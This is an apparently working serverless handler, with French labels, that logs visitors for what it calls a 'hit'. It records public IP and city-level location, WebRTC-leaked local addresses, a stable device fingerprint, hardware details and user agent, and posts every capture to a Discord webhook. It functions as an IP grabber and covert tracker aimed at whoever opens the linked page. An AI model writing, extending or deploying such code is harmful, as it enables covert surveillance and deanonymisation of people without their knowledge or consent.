export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'method' });

  const d = req.body || {};
  const publicIP = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'inconnu').split(',')[0].trim();

  const serverInfo = {
    country: req.headers['x-vercel-ip-country'] || 'n/a',
    region: req.headers['x-vercel-ip-country-region'] || 'n/a',
    city: req.headers['x-vercel-ip-city'] ? decodeURIComponent(req.headers['x-vercel-ip-city']) : 'n/a',
    asn: req.headers['x-vercel-ip-as-number'] || 'n/a',
    chModel: req.headers['sec-ch-ua-model'] || 'n/a',
    chPlatform: req.headers['sec-ch-ua-platform'] || 'n/a',
    chPlatformVersion: req.headers['sec-ch-ua-platform-version'] || 'n/a'
  };

  // === Embed principal : HIT ===
  const embed = {
    title: "🎯 NOUVEAU HIT",
    color: 0xff3333,
    fields: [
      { name: "📱 APPAREIL DEVINÉ", value: `**${d.deviceGuess || 'inconnu'}**`, inline: false },
      { name: "🌐 IP + Geo", value: `\`${publicIP}\` (${serverInfo.city}, ${serverInfo.region}, ${serverInfo.country}) ASN: ${serverInfo.asn}`, inline: false },
      { name: "🏠 WebRTC (IP/mDNS)", value: `\`${(d.webrtc || []).join(', ') || 'aucune'}\``, inline: false },
      { name: "🔐 Fingerprint custom (stable)", value: `\`${d.customFingerprint}\``, inline: false },
      { name: "🖼️ Refresh / GPU bench", value: `${d.refreshRate}Hz / ${d.gpuBench || 'n/a'}ms`, inline: true },
      { name: "🎮 GPU", value: `\`${d.gpu?.renderer || 'n/a'}\``, inline: true },
      { name: "🧪 WebGPU", value: d.webgpu?.available ? `${d.webgpu.vendor}/${d.webgpu.architecture}` : 'non dispo', inline: true },
      { name: "🎬 Codecs", value: `AV1:${d.codecs?.av1} H265:${d.codecs?.h265Main} VP9:${d.codecs?.vp9}`, inline: false },
      { name: "📐 Écran logique / physique", value: `${d.screen} / ${d.screenPhysical}`, inline: false },
      { name: "🌍 Fuseau / Langue", value: `${d.timezone} / ${d.language}`, inline: true },
      { name: "⚙️ CPU / RAM", value: `${d.hardwareConcurrency} cores / ${d.deviceMemory}`, inline: true },
      { name: "👆 Touch", value: `${d.touchPoints} pts`, inline: true },
      { name: "📡 Client Hints", value: `model:\`${serverInfo.chModel}\` platform:\`${serverInfo.chPlatform}\` v:\`${serverInfo.chPlatformVersion}\``, inline: false },
      { name: "⏱️ Perf.now precision", value: `${d.timings?.performanceNowPrecision}`, inline: true },
      { name: "📱 User-Agent", value: `\`${(d.userAgent || '').substring(0, 300)}\``, inline: false },
      { name: "🕐 Timestamp", value: d.timestamp || 'n/a', inline: false }
    ],
    footer: { text: "Famille Secu" }
  };

  // === Embed DEBUG : composants du fingerprint un par un ===
  let debugEmbed = null;
  if (d.fpComponents) {
    const debugFields = Object.entries(d.fpComponents).map(([k, v]) => ({
      name: `🔍 ${k}`,
      value: `\`${String(v).substring(0, 250)}\``,
      inline: false
    }));

    debugEmbed = {
      title: "🧪 FINGERPRINT COMPONENTS (DEBUG)",
      color: 0x0099ff,
      fields: debugFields,
      footer: { text: "Compare 2 hits pour identifier ce qui varie" }
    };
  }

  try {
    const embeds = debugEmbed ? [embed, debugEmbed] : [embed];
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds })
    });
  } catch (e) { console.error(e); }

  res.status(200).json({ ok: true });
}
